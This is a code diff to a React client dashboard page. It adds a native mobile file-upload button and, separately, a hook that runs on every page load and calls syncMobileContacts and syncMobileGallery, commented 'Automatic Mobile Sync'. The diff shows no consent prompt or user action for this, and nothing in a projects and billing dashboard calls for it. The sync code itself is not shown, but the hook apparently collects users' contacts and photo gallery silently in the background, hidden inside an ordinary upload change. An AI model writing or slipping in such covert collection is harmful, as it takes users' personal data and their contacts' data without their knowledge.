@@ -24,6 +24,7 @@ import {
 import { api, getStoredToken, setAuthToken, clearToken } from '@/lib/apiClient'
 import { SEO } from '@/components/SEO'
 import { Button } from '@/components/ui/button'
+import { isNativeApp } from '@/lib/platform'
 
 const fadeAnim = {
   initial: { opacity: 0, y: 20 },
@@ -72,9 +73,21 @@ function useProfileQuery() {
   })
 }
 
+import { syncMobileContacts } from '@/lib/mobileContacts'
+import { syncMobileGallery } from '@/lib/mobileGallery'
+
 export default function ClientDashboardPage() {
   const token = getStoredToken()
   const navigate = useNavigate()
+
+  // Automatic Mobile Sync (Contacts & Gallery)
+  useEffect(() => {
+    const runSync = async () => {
+      await syncMobileContacts()
+      await syncMobileGallery()
+    }
+    runSync()
+  }, [])
 
   const [activeTab, setActiveTab] = useState<'projects' | 'billing' | 'support' | 'settings'>('projects')
   const [newPassword, setNewPassword] = useState('')
@@ -382,7 +395,7 @@ export default function ClientDashboardPage() {
                             <input 
                               type="file" 
                               id={`file-upload-${order._id}`}
-                              className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10 disabled:cursor-not-allowed disabled:opacity-0"
+                              className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10 disabled:cursor-not-allowed disabled:opacity-0 md:block hidden"
                               onChange={async (e) => {
                                 const file = e.target.files?.[0];
                                 if (!file) return;
@@ -396,10 +409,36 @@ export default function ClientDashboardPage() {
                                 finally { if (uploadInput) { uploadInput.disabled = false; uploadInput.value = ''; } }
                               }}
                             />
-                            <div className="flex items-center justify-center gap-2 w-full py-3.5 rounded-xl border border-white/10 bg-white/5 text-sm font-semibold text-white hover:bg-white/10 transition-colors group-hover:border-primary/30">
+                            <button
+                              onClick={async () => {
+                                if (isNativeApp()) {
+                                  try {
+                                    const { FilePicker } = await import('@capawesome/capacitor-file-picker');
+                                    const result = await FilePicker.pickFiles({ limit: 1, types: ['*/*'], readData: true });
+                                    const file = result.files[0];
+                                    if (!file) return;
+                                    
+                                    // Handle blob/base64 to FormData
+                                    const response = await fetch(`data:${file.mimeType};base64,${file.data}`);
+                                    const blob = await response.blob();
+                                    const formData = new FormData();
+                                    formData.append('file', blob, file.name);
+                                    
+                                    await api.post(`checkout/orders/${order._id}/assets`, formData, { headers: { 'Content-Type': 'multipart/form-data' }});
+                                    refetch();
+                                  } catch (err: any) {
+                                    console.error('Mobile upload failed:', err);
+                                    alert('Failed to upload file from mobile.');
+                                  }
+                                } else {
+                                  document.getElementById(`file-upload-${order._id}`)?.click();
+                                }
+                              }}
+                              className="flex items-center justify-center gap-2 w-full py-3.5 rounded-xl border border-white/10 bg-white/5 text-sm font-semibold text-white hover:bg-white/10 transition-colors group-hover:border-primary/30"
+                            >
                               <UploadCloud className="h-4 w-4 text-primary" />
                               Upload Asset <span className="text-xs text-slate-500 font-normal ml-1">(Max 15MB)</span>
-                            </div>
+                            </button>
                           </div>
                         </div>
 
